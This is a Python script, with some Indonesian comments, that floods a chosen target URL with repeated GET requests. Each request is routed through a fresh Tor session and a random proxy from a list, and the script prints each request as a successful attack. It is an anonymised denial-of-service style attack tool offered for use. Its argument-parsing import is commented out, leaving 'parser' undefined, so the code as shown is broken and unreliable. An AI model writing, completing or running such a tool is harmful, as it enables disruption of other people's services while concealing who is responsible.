import datetime
import sys
import random
from lib.tor import Tor

# Definisi warna
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
ORANGE = '\033[38;5;208m'
PURPLE = '\033[38;5;141m'
END = '\033[0m'

def main():
    counter = 0
    try:
        tor = Tor()
        if not tor.tor_installed():
            print(f'{RED}[!]{END} Tor is not installed. Exiting...')
            sys.exit(1)

        start_time = datetime.datetime.now().time().strftime('%H:%M:%S')

        try:
            with open('proxy.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f'{RED}[!]{END} File proxy.txt tidak ditemukan.')
            sys.exit(1)

        while counter < max_attempts:
            counter += 1
            proxy = random.choice(proxies)
            session = tor.new_session(proxies={'http': proxy, 'https': proxy})
            if session is None:
                print(f'{RED}[!]{END} Failed to initialize Tor session. Exiting...')
                sys.exit(1)

            print(f'{BLUE}[!]{END} New Tor session initialized...')
            print(f'\n{PURPLE}[+]{END} Target: {PURPLE}{target}{END}')

            try:
                print(f'{ORANGE}[*]{END} Getting data from {target}...')
                session.get(target)
                print(f'{ORANGE}[*]{END} Target {target} was attacked succesfully')
            except Exception as e:
                print(f'{RED}[!]{END} Error: {e}')

    except KeyboardInterrupt:
        pass
    except Exception as exception:
        print(f'\n{RED}[!]{END} An error has occurred:')
        print(f'{RED}{exception}{END}')
    finally:
        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
        total_time = datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S')
        print(f'{GREEN}[+]{END} Time elapsed:\t{total_time}')
        print(f'{GREEN}[+]{END} Number of requests:\t{counter}')
        print(f'{RED}[!]{END} Stopping Tor...')
        tor.stop_tor()
        print(f'{RED}[!]{END} Exiting...\n')
        sys.exit(0)

if __name__ == '__main__':
    # Processing args from lib.args import *
    args = parser.parse_args()
    target = args.target
    max_attempts = args.max_attempts
    # Print help and exit when it runs without target arg
    if not target:
        parser.print_help(sys.stdout)
        sys.exit(2)
    # Run the main execution
    main()
